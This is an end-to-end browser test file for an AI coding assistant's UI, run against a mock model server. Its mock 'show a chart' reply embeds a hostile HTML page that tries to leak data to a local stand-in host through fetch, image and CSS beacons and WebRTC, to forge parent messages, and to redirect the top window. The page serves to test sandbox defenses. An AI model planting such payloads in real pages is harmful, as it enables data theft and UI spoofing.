// End-to-end: the real engine and the real UI in Chromium, against a mock OpenAI-compatible
// server. Covers a chat turn (streaming), an Agent run that writes a file through the tool
// loop, and that the transcript survives a reload.
import { launchChromium } from './browser.mjs';
import { startHost, startMock } from './harness.mjs';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import assert from 'node:assert/strict';

// Write once per conversation: after that the agent's own completion gate may nudge the model to
// verify, and a model that wrote again on every nudge would never finish.
const mock = await startMock(req => {
	// The memory suggestion request (stormcoder.memory.autoPropose): answer it with one fact.
	if (String(req.messages.at(-1)?.content).includes('Write a git commit message for the following staged changes')) {
		return 'Add hello file from the model';
	}
	if (String(req.messages.at(-1)?.content).includes('You maintain a short project memory')) {
		return '[{"type":"gotcha","text":"Proposed by the model after the run."}]';
	}
	const alreadyWrote = req.messages.some(m => m.role === 'tool');
	// A visual reply: a page that draws something, then tries everything a hostile page would.
	if (String(req.messages.filter(m => m.role === 'user').at(-1)?.content).includes('show a chart')) {
		if (alreadyWrote) { return 'Here is the chart.'; }
		const out = `http://127.0.0.1:${mock.port}`;
		const html = `<!doctype html><html><head><style>h1 { color: rgb(1, 2, 3); } body { background: url('${out}/leak-css.png'); }</style>
<link rel="stylesheet" href="${out}/leak.css"></head><body><h1 id="t">chart ready</h1>
<svg id="chart" viewBox="0 0 10 10" width="40" height="40"><rect width="4" height="9" fill="teal"/></svg>
<img src="${out}/leak-img.png" alt=""><script>
document.getElementById('t').textContent = 'SCRIPT RAN';
parent.postMessage({ type: 'info', message: 'FORGED BY PAGE' }, '*');
parent.postMessage({ mj: 'toView', message: { type: 'info', message: 'FORGED VIA ENVELOPE' } }, '*');
fetch('${out}/leak', { method: 'POST', body: JSON.stringify({ model: 'LEAK' }) }).catch(function () {});
new Image().src = '${out}/leak.png';
try { top.location = '${out}/top'; } catch (e) {}
try { new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:${mock.port}' }] }).createDataChannel('leak'); } catch (e) {}
</scr` + `ipt></body></html>`;
		return { text: 'Drawing it.', tool: { name: 'show_page', args: { title: 'Sales by month', html } } };
	}
	if (req.tools?.some(t => t.function?.name === 'write_file') && !alreadyWrote) {
		return { text: 'Creating the file.', tool: { name: 'write_file', args: { path: 'hello.txt', content: 'hello from stormcoder\n' } } };
	}
	return alreadyWrote ? 'Done: hello.txt written.' : 'Hello from the mock model.';
});
const seen = mock.seen;
const host = await startHost({ mockPort: mock.port, settings: { 'stormcoder.memory.autoPropose': true, 'stormcoder.voice.provider': 'custom' } });
const project = host.project;
fs.mkdirSync(path.join(project, '.stormcoder'), { recursive: true });
fs.writeFileSync(path.join(project, '.stormcoder/memory.md'), '- [gotcha] The build needs the moon phase set. (2026-10-01)\n');
fs.writeFileSync(path.join(project, '.stormcoder/proposals.json'), JSON.stringify([
	{ id: 'p1', type: 'gotcha', text: 'Seeded suggestion about the tide table.', goal: 'Fix the build', date: '2026-10-01' },
	{ id: 'p2', type: 'command', text: 'Seeded suggestion to dismiss.', goal: 'Fix the build', date: '2026-10-01' },
]));
const url = host.url;

const browser = await launchChromium();
let failed = false;
try {
	const page = await browser.newPage({ viewport: { width: 1280, height: 800 } });
	const errors = [];
	page.on('pageerror', e => errors.push(e.message));
	await page.goto(url);
	const chat = page.frameLocator('#view-chat');
	await chat.locator('#input').waitFor();
	// The box is there before the host's first `sessions` push; Enter with no session is a no-op.
	await chat.locator('.chat-tab').first().waitFor();

	// 1. A plain Ask turn streams a reply.
	await chat.locator('#input').fill('say hello');
	await chat.locator('#input').press('Enter');
	await chat.getByText('Hello from the mock model.').waitFor({ timeout: 15000 });

	// 1b. Composer extras. A very large paste becomes an attachment chip instead of filling the
	// box; a small one lands in the box as usual.
	const paste = (text) => chat.locator('#input').evaluate((el, t) => {
		const data = new DataTransfer();
		data.setData('text/plain', t);
		return !el.dispatchEvent(new ClipboardEvent('paste', { clipboardData: data, bubbles: true, cancelable: true }));
	}, text);
	assert.equal(await paste('short text'), false, 'a small paste is left to the box');
	assert.equal(await paste('line\n'.repeat(8000)), true, 'a large paste is taken over');
	assert.equal((await chat.locator('#contextChip .chip-text').innerText()).trim(), 'Pasted text, 8001 lines');
	assert.equal(await chat.locator('#input').inputValue(), '', 'and none of it reaches the box');
	assert.equal(await paste('line\n'.repeat(8000)), false, 'a second large paste does not replace the attachment');
	await chat.locator('#removeCtx').click();
	// Ctrl+Shift+S parks the draft and brings it back; with both present they swap.
	await chat.locator('#input').fill('first draft');
	await chat.locator('#input').press('Control+Shift+S');
	assert.equal(await chat.locator('#input').inputValue(), '');
	await chat.locator('#stashChip').waitFor();
	await chat.locator('#input').fill('second draft');
	await chat.locator('#input').press('Control+Shift+S');
	assert.equal(await chat.locator('#input').inputValue(), 'first draft');
	await chat.locator('#stashChip').click();
	assert.equal(await chat.locator('#input').inputValue(), 'second draft');
	await chat.locator('#input').fill('');
	await chat.locator('#input').press('Control+Shift+S');
	assert.equal(await chat.locator('#input').inputValue(), 'first draft');
	assert.equal(await chat.locator('#stashChip').count(), 0, 'nothing is left parked');
	await chat.locator('#input').fill('');

	// 1b2. Voice input: with a provider chosen, the microphone button records, the recording is
	// transcribed by that provider, and the text lands in the box. Nothing is sent as a message.
	await chat.locator('#micButton:not(.hidden)').waitFor();
	await chat.locator('#input').fill('note:');
	await chat.locator('#micButton').click();
	await chat.locator('#micButton.recording').waitFor({ timeout: 10000 });
	await new Promise(r => setTimeout(r, 700));
	await chat.locator('#micButton').click();
	for (let i = 0; i < 100 && await chat.locator('#input').inputValue() === 'note:'; i++) { await new Promise(r => setTimeout(r, 100)); }
	assert.equal(await chat.locator('#input').inputValue(), 'note: hello from the mock transcriber');
	const heard = mock.heard;
	assert.equal(heard.length, 1, 'one recording was sent');
	assert.equal(heard[0].model, 'whisper-1');
	assert.equal(heard[0].hasFile, true);
	assert.equal(await chat.locator('#messages > .message.user').count(), 1, 'dictating sends no message');
	// Escape while recording throws the recording away.
	await chat.locator('#micButton').click();
	await chat.locator('#micButton.recording').waitFor({ timeout: 10000 });
	await page.keyboard.press('Escape');
	await chat.locator('#micButton:not(.recording):not(.busy)').waitFor();
	await new Promise(r => setTimeout(r, 400));
	assert.equal(mock.heard.length, 1, 'a discarded recording is not sent');
	await chat.locator('#input').fill('');

	// 1c. Edit and resend: an earlier prompt loads into the box, Escape leaves the chat alone,
	// and sending replaces that prompt and everything after it.
	const editPrompt = (detail) => chat.locator('body').evaluate((_el, d) => {
		window.dispatchEvent(new CustomEvent('stormcoder-edit-prompt', { detail: d }));
		return d.allowed;
	}, detail);
	const userTexts = () => chat.locator('#messages > .message.user .body').allInnerTexts();
	assert.equal(await editPrompt({ query: true, index: 0, allowed: false }), true, 'the first prompt can be edited');
	assert.equal(await editPrompt({ query: true, index: 1, allowed: false }), false, 'an assistant turn cannot');
	await editPrompt({ index: 0 });
	assert.equal(await chat.locator('#input').inputValue(), 'say hello');
	await chat.locator('#editChip').waitFor();
	await chat.locator('#input').press('Escape');
	assert.equal(await chat.locator('#editChip').count(), 0, 'Escape leaves edit mode');
	assert.deepEqual((await userTexts()).map(t => t.trim()), ['say hello'], 'and the chat is untouched');
	await editPrompt({ index: 0 });
	await chat.locator('#input').fill('say hello again');
	await chat.locator('#input').press('Enter');
	await chat.locator('#messages > .message.assistant', { hasText: 'Hello from the mock model.' }).waitFor({ timeout: 15000 });
	await chat.locator('#sendButton:not(.hidden)').waitFor({ timeout: 15000 });
	assert.deepEqual((await userTexts()).map(t => t.trim()), ['say hello again'], 'the old prompt and its reply are gone');
	assert.equal(await chat.locator('#messages > .message.assistant').count(), 1);
	assert.equal(await chat.locator('#editChip').count(), 0);

	// 1d. The right-click menus: quoting selected reply text, editing your own message, and the
	// tab strip's worktree entry.
	const menuItems = () => chat.locator('.sc-menu .sc-item').allInnerTexts();
	const reply = chat.locator('#messages > .message.assistant .body').first();
	await reply.evaluate(el => { const r = document.createRange(); r.selectNodeContents(el); const sel = getSelection(); sel.removeAllRanges(); sel.addRange(r); });
	await reply.click({ button: 'right' });
	await chat.locator('.sc-menu .sc-item', { hasText: 'Quote in reply' }).click();
	assert.equal(await chat.locator('#input').inputValue(), '> Hello from the mock model.\n\n');
	await chat.locator('#input').fill('');
	await chat.locator('#messages > .message.user .body').first().click({ button: 'right' });
	assert.ok((await menuItems()).some(t => t.includes('Edit and resend')), 'your own message offers Edit and resend');
	await page.keyboard.press('Escape');
	await chat.locator('.tab-add').click({ button: 'right' });
	assert.deepEqual((await menuItems()).map(t => t.trim()), ['New chat', 'New chat in a worktree'], 'the + button has no Close entry');
	await page.keyboard.press('Escape');
	await chat.locator('#input').fill('');

	// 2. An Agent turn runs the tool loop and writes into the project folder.
	await chat.locator('.seg-btn[data-value=agent]').click();
	await chat.locator('#input').fill('create hello.txt');
	await chat.locator('#input').press('Enter');
	await chat.getByText('Done: hello.txt written.').first().waitFor({ timeout: 20000 });
	assert.equal(fs.readFileSync(path.join(project, 'hello.txt'), 'utf8'), 'hello from stormcoder\n');
	assert.ok(seen.some(r => r.tools?.some(t => t.function?.name === 'write_file')), 'the agent request offered write_file');
	// Project memory: a saved fact reaches the model's system prompt, and the run that changed a
	// file is journaled for the next session.
	assert.ok(seen.some(r => String(r.messages?.[0]?.content).includes('The build needs the moon phase set.')), 'saved memory is in the system prompt');
	const journalFile = path.join(project, '.stormcoder/journal.jsonl');
	for (let i = 0; i < 50 && !fs.existsSync(journalFile); i++) { await new Promise(r => setTimeout(r, 100)); }
	assert.ok(fs.existsSync(journalFile), 'the run was journaled');
	const journaled = JSON.parse(fs.readFileSync(journalFile, 'utf8').trim().split('\n').at(-1));
	assert.equal(journaled.goal, 'create hello.txt');
	assert.deepEqual(journaled.files, ['hello.txt']);
	if (process.env.E2E_SHOT) { await page.screenshot({ path: process.env.E2E_SHOT }); }

	// 2b. The Usage sheet reads the log the providers append to and adds it up per model.
	{
		const pad = n => String(n).padStart(2, '0');
		const d = new Date();
		const today = `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())}`;
		const usageFile = path.join(host.data, 'storage', 'usage.jsonl');
		fs.mkdirSync(path.dirname(usageFile), { recursive: true });
		fs.appendFileSync(usageFile, [
			{ day: today, provider: 'openai', model: 'gpt-x', input: 1200, output: 300, cacheRead: 800, cacheWrite: 0 },
			{ day: today, provider: 'openai', model: 'gpt-x', input: 800, output: 100, cacheRead: 200, cacheWrite: 0 },
			{ day: '2001-01-01', provider: 'old', model: 'ancient', input: 5, output: 5, cacheRead: 0, cacheWrite: 0 },
		].map(e => JSON.stringify(e)).join('\n') + '\n');
		await page.click('#markBtn');
		await page.getByRole('menuitem', { name: 'Usage' }).click();
		await page.locator('#usage:not(.hidden) .usage-table').waitFor();
		const row = page.locator('#usageBody .usage-table tbody tr', { hasText: 'openai / gpt-x' });
		assert.deepEqual((await row.locator('td').allInnerTexts()).map(t => t.trim()), ['openai / gpt-x', '2', '2,000', '1,000', '400']);
		assert.equal(await page.locator('#usageBody', { hasText: 'ancient' }).count(), 0, 'entries outside the period are left out');
		assert.equal((await page.locator('#usageBody .usage-total b').nth(2).innerText()).trim(), '33%', 'cache share of prompt tokens');
		await page.keyboard.press('Escape');
		await page.locator('#usage.hidden').waitFor({ state: 'attached' });
	}

	// 3. Settings opens as its own view, and areas switch.
	await page.click('[data-view=settings]');
	const settings = page.frameLocator('#view-settings');
	await settings.locator('.area.active[data-area=providers]').waitFor();
	await settings.getByRole('button', { name: 'Agent permissions' }).click();
	await settings.locator('.area.active[data-area=permissions]').waitFor();

	// Settings > General holds the notification, tool-call and voice choices. Each shows what is
	// saved, a pick is written to settings.json, and a value the setting does not allow is not.
	await settings.getByRole('button', { name: 'General', exact: true }).click();
	await settings.locator('.area.active[data-area=general]').waitFor();
	const saved = () => JSON.parse(fs.readFileSync(path.join(host.data, 'settings.json'), 'utf8'));
	const waitSaved = async (key, value) => { for (let i = 0; i < 50 && saved()[key] !== value; i++) { await new Promise(r => setTimeout(r, 100)); } return saved()[key]; };
	assert.equal(await settings.locator('#voiceProviderSelect').inputValue(), 'custom', 'the saved voice provider is shown');
	assert.equal(await settings.locator('#notificationsSelect').inputValue(), 'attention');
	await settings.locator('#toolCallsSelectButton').click();
	await settings.locator('.sc-menu .sc-item', { hasText: 'Show every call' }).click();
	assert.equal(await waitSaved('stormcoder.chat.toolCalls', 'all'), 'all');
	await settings.locator('#notificationsSelectButton').click();
	await settings.locator('.sc-menu .sc-item', { hasText: 'Also when a run finishes' }).click();
	assert.equal(await waitSaved('stormcoder.notifications', 'all'), 'all');
	await settings.locator('#voiceModelInput').fill('whisper-test');
	await settings.locator('#saveVoiceModel').click();
	assert.equal(await waitSaved('stormcoder.voice.model', 'whisper-test'), 'whisper-test');
	// Back to the defaults the rest of this test expects.
	await settings.locator('#toolCallsSelectButton').click();
	await settings.locator('.sc-menu .sc-item', { hasText: 'Fold three or more' }).click();
	assert.equal(await waitSaved('stormcoder.chat.toolCalls', 'grouped'), 'grouped');
	await settings.locator('#voiceModelInput').fill('');
	await settings.locator('#saveVoiceModel').click();
	assert.equal(await waitSaved('stormcoder.voice.model', ''), '');
	await settings.getByRole('button', { name: 'Agent permissions' }).click();
	await settings.locator('.area.active[data-area=permissions]').waitFor();

	// Project memory can be switched off from Settings > General, and the choice is saved.
	await settings.getByRole('button', { name: 'Memory' }).click();
	await settings.locator('.area.active[data-area=memory]').waitFor();
	// The saved fact seeded before the first send is listed, and can be pinned.
	await settings.locator('#memoryProject .mem-row', { hasText: 'The build needs the moon phase set.' }).waitFor({ timeout: 10000 });
	const memoryToggle = settings.locator('#enableMemory');
	assert.equal(await memoryToggle.isChecked(), true, 'memory is on by default');
	await memoryToggle.uncheck();
	const settingsFile = path.join(host.data, 'settings.json');
	for (let i = 0; i < 50 && !(fs.existsSync(settingsFile) && JSON.parse(fs.readFileSync(settingsFile, 'utf8'))['stormcoder.memory.enabled'] === false); i++) { await new Promise(r => setTimeout(r, 100)); }
	assert.equal(JSON.parse(fs.readFileSync(settingsFile, 'utf8'))['stormcoder.memory.enabled'], false, 'turning memory off is saved');
	assert.equal(await settings.locator('#memoryRecentRunsInput').isDisabled(), true, 'the runs count is greyed out while memory is off');
	await memoryToggle.check();
	for (let i = 0; i < 50 && JSON.parse(fs.readFileSync(settingsFile, 'utf8'))['stormcoder.memory.enabled'] !== true; i++) { await new Promise(r => setTimeout(r, 100)); }
	assert.equal(JSON.parse(fs.readFileSync(settingsFile, 'utf8'))['stormcoder.memory.enabled'], true, 'turning it back on is saved');

	// Notes can be added, pinned, edited and deleted from the panel, for this project and for the user.
	const memFile = path.join(project, '.stormcoder/memory.md');
	await settings.locator('#memoryNewType button', { hasText: 'command' }).click();
	await settings.locator('#memoryNewText').fill('Run the linter with npm run lint.');
	await settings.locator('#memoryAddBtn').click();
	await settings.locator('#memoryProject .mem-row', { hasText: 'Run the linter with npm run lint.' }).waitFor({ timeout: 10000 });
	assert.match(fs.readFileSync(memFile, 'utf8'), /\[command\] Run the linter with npm run lint\./);
	const lintRow = settings.locator('#memoryProject .mem-row', { hasText: 'Run the linter' });
	await lintRow.getByRole('button', { name: 'Pin' }).click();
	await settings.locator('#memoryProject .mem-row.pinned', { hasText: 'Run the linter' }).waitFor({ timeout: 10000 });
	assert.match(fs.readFileSync(memFile, 'utf8'), /\[command\*\] Run the linter/);
	await settings.locator('#memoryProject .mem-row', { hasText: 'Run the linter' }).getByRole('button', { name: 'Edit' }).click();
	await settings.locator('#memoryProject .mem-edit').fill('Run the linter with pnpm lint.');
	await settings.locator('#memoryProject').getByRole('button', { name: 'Save' }).click();
	await settings.locator('#memoryProject .mem-row', { hasText: 'pnpm lint' }).waitFor({ timeout: 10000 });
	assert.match(fs.readFileSync(memFile, 'utf8'), /pnpm lint/);
	await settings.locator('#memoryProject .mem-row', { hasText: 'pnpm lint' }).getByRole('button', { name: 'Delete' }).click();
	await settings.locator('#memoryProject .mem-row', { hasText: 'pnpm lint' }).waitFor({ state: 'detached', timeout: 10000 });
	assert.doesNotMatch(fs.readFileSync(memFile, 'utf8'), /pnpm lint/);
	await settings.locator('#memoryNewScope button', { hasText: 'Every project' }).click();
	await settings.locator('#memoryNewText').fill('I prefer small, focused commits.');
	await settings.locator('#memoryAddBtn').click();
	await settings.locator('#memoryUser .mem-row', { hasText: 'small, focused commits' }).waitFor({ timeout: 10000 });
	assert.ok(fs.readdirSync(path.join(host.data, 'storage', 'memory')).includes('memory.md'), 'personal notes live in the app data, not the project');
	// Suggestions queued by a finished run: accept one (it becomes a saved fact), dismiss the other.
	// The run in step 2 changed a file, so the model was asked once and its suggestion is waiting.
	const proposed = settings.locator('#memorySuggestions .mem-row', { hasText: 'Proposed by the model after the run.' });
	await proposed.waitFor({ timeout: 15000 });
	assert.match(await proposed.textContent(), /After: create hello\.txt/, 'the suggestion says which request it followed');
	assert.equal(seen.filter(r => String(r.messages.at(-1)?.content).includes('You maintain a short project memory')).length, 1, 'one extra request per run, not more');
	await proposed.getByRole('button', { name: 'Dismiss' }).click();
	await proposed.waitFor({ state: 'detached', timeout: 10000 });
	const tide = settings.locator('#memorySuggestions .mem-row', { hasText: 'tide table' });
	await tide.waitFor({ timeout: 10000 });
	await tide.getByRole('button', { name: 'Accept' }).click();
	await settings.locator('#memoryProject .mem-row', { hasText: 'tide table' }).waitFor({ timeout: 10000 });
	assert.match(fs.readFileSync(memFile, 'utf8'), /\[gotcha\] Seeded suggestion about the tide table\./);
	await settings.locator('#memorySuggestions .mem-row', { hasText: 'to dismiss' }).getByRole('button', { name: 'Dismiss' }).click();
	await settings.locator('#memorySuggestions .mem-row').first().waitFor({ state: 'detached', timeout: 10000 });
	assert.doesNotMatch(fs.readFileSync(memFile, 'utf8'), /to dismiss/, 'a dismissed suggestion is not saved');
	assert.deepEqual(JSON.parse(fs.readFileSync(path.join(project, '.stormcoder/proposals.json'), 'utf8')), [], 'no suggestions are left waiting');
	// A secret is refused with the reason shown.
	await settings.locator('#memoryNewText').fill('password = hunter2hunter2');
	await settings.locator('#memoryAddBtn').click();
	await settings.locator('#memoryNotice', { hasText: 'credential' }).waitFor({ timeout: 10000 });
	await settings.locator('#memoryNewText').fill('');

	// /memory in the chat: status, and a quick save.
	await page.click('[data-view=chat]');
	await chat.locator('#input').fill('/memory');
	await chat.locator('#input').press('Enter');
	await chat.getByText('Project memory is on', { exact: false }).first().waitFor({ timeout: 15000 });
	await chat.locator('#input').fill('/memory add user Prefer early returns over nested ifs.');
	await chat.locator('#input').press('Enter');
	await chat.getByText('Remembered [note]', { exact: false }).first().waitFor({ timeout: 15000 });
	assert.match(fs.readFileSync(path.join(host.data, 'storage', 'memory', 'memory.md'), 'utf8'), /Prefer early returns over nested ifs\./);


	// The Changes view: what the run changed, then stage, commit and a refused push.
	const gitIn = (...args) => execFileSync('git', args, { cwd: project, encoding: 'utf8' });
	gitIn('init', '-q', '-b', 'main');
	gitIn('config', 'user.name', 'E2E');
	gitIn('config', 'user.email', 'e2e@example.com');
	await page.click('[data-view=changes]');
	const changes = page.locator('#view-changes');
	const helloRow = changes.locator('.ch-row', { hasText: 'hello.txt' });
	await helloRow.waitFor({ timeout: 15000 });
	assert.equal(await helloRow.locator('.ch-tag').textContent(), 'agent', 'a file the agent wrote is tagged');
	await helloRow.click();
	await changes.locator('.ch-a', { hasText: 'hello from stormcoder' }).waitFor({ timeout: 10000 });
	assert.ok((await page.locator('#changesBadge').textContent()).length > 0, 'the rail badge counts changed files');
	await changes.getByRole('button', { name: 'Stage all' }).click();
	await changes.locator('.ch-group', { hasText: /^Staged \(/ }).waitFor({ timeout: 10000 });
	assert.ok(await changes.getByRole('button', { name: /^Commit \d+$/ }).isDisabled(), 'commit waits for a message');
	await changes.getByRole('button', { name: 'Generate' }).click();
	await page.waitForFunction(() => { const m = document.querySelector('#view-changes .ch-msg'); return !!m && !m.disabled && m.value.length > 0; }, undefined, { timeout: 15000 });
	assert.equal(await changes.locator('.ch-msg').inputValue(), 'Add hello file from the model', 'Generate fills the message from the model');
	assert.ok(await changes.getByRole('button', { name: 'Regenerate' }).isVisible(), 'the button then offers Regenerate');
	await changes.getByRole('button', { name: /^Commit \d+$/ }).click();
	await changes.getByText('Committed', { exact: false }).first().waitFor({ timeout: 15000 });
	assert.equal(gitIn('log', '-1', '--format=%s').trim(), 'Add hello file from the model');
	await changes.getByRole('button', { name: 'Publish branch' }).click();
	await changes.getByText('Force', { exact: true }).waitFor({ timeout: 5000 });
	await changes.getByRole('button', { name: 'Confirm publish' }).click();
	await changes.getByText('no remote', { exact: false }).first().waitFor({ timeout: 15000 });
	await changes.getByRole('tab', { name: 'Files' }).click();
	await changes.locator('.ch-row', { hasText: 'hello.txt' }).click();
	await changes.locator('.ch-ln', { hasText: 'hello from stormcoder' }).waitFor({ timeout: 10000 });
	await changes.getByRole('tab', { name: 'Changes' }).click();

	// One hunk at a time.
	const rows40 = Array.from({ length: 40 }, (_, i) => `row${i + 1}`);
	fs.writeFileSync(path.join(project, 'multi.txt'), rows40.join('\n') + '\n');
	gitIn('add', 'multi.txt');
	gitIn('commit', '-q', '-m', 'multi');
	const edited = [...rows40];
	edited[1] = 'EDIT-A';
	edited[37] = 'EDIT-B';
	fs.writeFileSync(path.join(project, 'multi.txt'), edited.join('\n') + '\n');
	await page.click('[data-view=chat]');
	await page.click('[data-view=changes]');
	await changes.locator('.ch-row', { hasText: 'multi.txt' }).click();
	await changes.locator('.ch-hunk').nth(1).waitFor({ timeout: 10000 });
	await changes.getByRole('button', { name: 'Stage hunk' }).first().click();
	await changes.locator('.ch-group', { hasText: /^Staged \(/ }).waitFor({ timeout: 10000 });
	assert.match(gitIn('diff', '--cached', 'multi.txt'), /EDIT-A/);
	assert.doesNotMatch(gitIn('diff', '--cached', 'multi.txt'), /EDIT-B/, 'only the chosen hunk is staged');

	// Discard asks first, then puts the file back.
	await changes.locator('.ch-row', { hasText: 'multi.txt' }).last().click();
	await changes.getByRole('button', { name: 'Discard', exact: true }).first().click();
	await changes.getByText('Undo', { exact: true }).waitFor({ timeout: 5000 });
	await changes.getByRole('button', { name: 'Cancel' }).click();
	assert.match(fs.readFileSync(path.join(project, 'multi.txt'), 'utf8'), /EDIT-B/, 'cancel leaves the file alone');
	await changes.getByRole('button', { name: 'Discard', exact: true }).first().click();
	await changes.locator('.ch-confirm').getByRole('button', { name: 'Discard' }).click();
	await changes.getByText('Changes discarded', { exact: false }).waitFor({ timeout: 10000 });
	assert.doesNotMatch(fs.readFileSync(path.join(project, 'multi.txt'), 'utf8'), /EDIT-B/);

	// Stash: it is named, listed, viewable, and comes back with Pop. Stormcoder's own folder stays.
	await changes.getByRole('button', { name: 'Stash', exact: true }).click();
	await changes.locator('.ch-group', { hasText: /^Stashes \(1\)/ }).waitFor({ timeout: 10000 });
	assert.match(gitIn('stash', 'list'), /main, \d{4}-\d{2}-\d{2} \d{2}:\d{2}/);
	assert.ok(fs.existsSync(path.join(project, '.stormcoder')), 'the stash leaves .stormcoder alone');
	await changes.locator('.ch-row', { hasText: /^main, \d{4}/ }).click();
	await changes.locator('.ch-filehead', { hasText: 'multi.txt' }).waitFor({ timeout: 10000 });
	await changes.getByRole('button', { name: 'Pop', exact: true }).click();
	await changes.getByText('removed from the list', { exact: false }).waitFor({ timeout: 10000 });
	await changes.locator('.ch-row', { hasText: 'multi.txt' }).first().waitFor({ timeout: 10000 });
	assert.equal(gitIn('stash', 'list').trim(), '');
	// Dropping asks first.
	await changes.getByRole('button', { name: 'Stash', exact: true }).click();
	await changes.locator('.ch-row', { hasText: /^main, \d{4}/ }).click();
	await changes.getByRole('button', { name: 'Drop', exact: true }).click();
	await changes.locator('.ch-confirm').getByRole('button', { name: 'Drop stash' }).click();
	await changes.getByText('Stash dropped', { exact: false }).waitFor({ timeout: 10000 });
	assert.equal(gitIn('stash', 'list').trim(), '');
	// While a run is in flight nothing can be stashed.
	fs.writeFileSync(path.join(project, 'busy.txt'), 'x\n');
	await page.click('[data-view=chat]');
	await page.click('[data-view=changes]');
	await changes.locator('.ch-row', { hasText: 'busy.txt' }).waitFor({ timeout: 10000 });
	await page.evaluate(() => window.StormChanges.setRunning(true));
	assert.ok(await changes.getByRole('button', { name: 'Stash', exact: true }).isDisabled(), 'Stash waits for the run');
	await page.evaluate(() => window.StormChanges.setRunning(false));
	assert.ok(await changes.getByRole('button', { name: 'Stash', exact: true }).isEnabled());
	fs.rmSync(path.join(project, 'busy.txt'));
	gitIn('checkout', '-q', '--', '.');
	gitIn('reset', '-q');
	gitIn('stash', 'clear');

	// Publish a feature branch to a local remote, then open its pull request page.
	const bare = path.join(host.data, 'remote.git');
	execFileSync('git', ['init', '--bare', '-q', '-b', 'main', bare]);
	gitIn('remote', 'add', 'origin', bare);
	gitIn('checkout', '-q', '-b', 'feature/x');
	await page.click('[data-view=chat]');
	await page.click('[data-view=changes]');
	await changes.getByRole('button', { name: 'Publish branch' }).click();
	await changes.getByRole('button', { name: 'Confirm publish' }).click();
	await changes.getByText('Pushed to origin/feature/x', { exact: false }).waitFor({ timeout: 15000 });
	await changes.getByRole('button', { name: 'Open pull request' }).first().click();
	await changes.getByText('no remote to open a pull request', { exact: false }).waitFor({ timeout: 10000 });
	gitIn('remote', 'set-url', 'origin', 'git@github.com:acme/widgets.git');
	const [popup] = await Promise.all([page.waitForEvent('popup', { timeout: 10000 }), changes.getByRole('button', { name: 'Open pull request' }).first().click()]);
	assert.equal(popup.url(), 'https://github.com/acme/widgets/compare/feature%2Fx?expand=1');
	await popup.close();
	gitIn('remote', 'set-url', 'origin', bare);

	// Docked: the chat and the Changes view side by side; the choice sticks and can be undone.
	await changes.getByRole('button', { name: 'Dock beside chat' }).click();
	await page.locator('#views.split').waitFor({ timeout: 5000 });
	const chatBox = await page.locator('#view-chat').boundingBox();
	const changesBox = await page.locator('#view-changes').boundingBox();
	assert.ok(chatBox.width > 300 && changesBox.width > 300 && chatBox.x + chatBox.width <= changesBox.x + 2, 'chat is left, Changes is right, neither covers the other');
	await page.click('[data-view=chat]');
	assert.ok(await page.locator('#views.split').count() === 1, 'the panel stays beside the chat');
	await page.click('[data-view=history]');
	assert.equal(await page.locator('#views.split').count(), 0, 'other views take the whole window');
	await page.click('[data-view=changes]');
	await changes.getByRole('button', { name: 'Undock' }).click();
	assert.equal(await page.locator('#views.split').count(), 0);
	await page.click('[data-view=chat]');

	// 4. The palette opens and filters.
	await page.keyboard.press('Control+k');
	await page.fill('#paletteInput', 'mcp');
	assert.ok(await page.locator('#paletteList li', { hasText: 'MCP' }).count() > 0);
	await page.keyboard.press('Escape');

	// The mode switch drives the real select, and its thumb sits under the chosen segment.
	assert.equal(await chat.locator('#modeSelect').inputValue(), 'agent');
	const thumbX = await chat.locator('.seg-thumb').evaluate(el => parseFloat(el.style.getPropertyValue('--x')));
	const segX = await chat.locator('.seg-btn.on').evaluate(el => el.offsetLeft);
	assert.equal(thumbX, segX, 'the switch thumb follows the selected mode');

	// The rail indicator follows the active destination; the title swaps with it.
	const indY = async () => page.locator('.rail-ind').evaluate(el => el.style.transform);
	const before = await indY();
	await page.click('[data-view=history]');
	assert.notEqual(await indY(), before, 'the rail indicator moved');
	assert.equal(await page.textContent('#viewTitle'), 'History');
	await page.click('[data-view=chat]');

	// Theme: switching changes the shell and both frames, and the choice is remembered.
	await page.click('#themeBtn');
	const themeOf = async sel => page.frameLocator(sel).locator('html').evaluate(el => el.dataset.theme);
	const shellTheme = await page.evaluate(() => document.documentElement.dataset.theme);
	// The frame is told by message, so it follows a moment later.
	await page.waitForFunction(t => document.getElementById('view-chat').contentDocument.documentElement.dataset.theme === t, shellTheme);
	assert.equal(await themeOf('#view-chat'), shellTheme);
	assert.equal(await page.evaluate(() => localStorage.getItem('sc-theme')), shellTheme);
	await page.click('#themeBtn');
	assert.notEqual(await page.evaluate(() => document.documentElement.dataset.theme), shellTheme);

	// Reduced motion removes the entrance animations rather than just shortening them.
	await page.emulateMedia({ reducedMotion: 'reduce' });
	await page.click('[data-view=settings]');
	const anim = await settings.locator('.area.active').evaluate(el => getComputedStyle(el).animationName);
	assert.equal(anim, 'none', 'no entrance animation under reduced motion');
	await page.emulateMedia({ reducedMotion: 'no-preference' });

	await page.click('[data-view=chat]');

	// Menus replace native dropdowns: the model picker lists the provider's models, narrows as you
	// type, and choosing one sets the real (hidden) select.
	await chat.locator('#modelSelectButton').click();
	const menu = chat.locator('.sc-menu.open');
	await menu.waitFor();
	assert.ok(await menu.locator('.sc-item').count() > 7, 'the model list is shown');
	assert.equal(await chat.locator('#modelSelectButton').getAttribute('aria-expanded'), 'true');
	await page.keyboard.type('qwen');
	assert.equal(await menu.locator('.sc-item').count(), 1, 'typing narrows the list');
	await page.keyboard.press('Enter');
	await menu.waitFor({ state: 'detached' });
	assert.equal(await chat.locator('#modelSelect').inputValue(), 'qwen3-coder-480b');
	assert.match(await chat.locator('#modelSelectButton .picker-label').textContent(), /qwen3-coder/);

	// Arrow keys and Enter drive a menu without the mouse.
	await chat.locator('#approvalSelectButton').click();
	await page.keyboard.press('ArrowUp');
	await page.keyboard.press('Enter');
	assert.equal(await chat.locator('#approvalSelect').inputValue(), 'auto-edits');

	// The app menu opens from the brand mark and leads to the shortcuts sheet.
	await page.click('#markBtn');
	await page.locator('.sc-menu.open').waitFor();
	await page.locator('.sc-item', { hasText: 'Keyboard shortcuts' }).click();
	await page.locator('#keys:not(.hidden)').waitFor();
	await page.keyboard.press('Escape');
	await page.locator('#keys.hidden').waitFor({ state: 'attached' });

	// The project popover names the open folder.
	await page.click('#projectBtn');
	await page.locator('.sc-menu.open .sc-item.checked').waitFor();
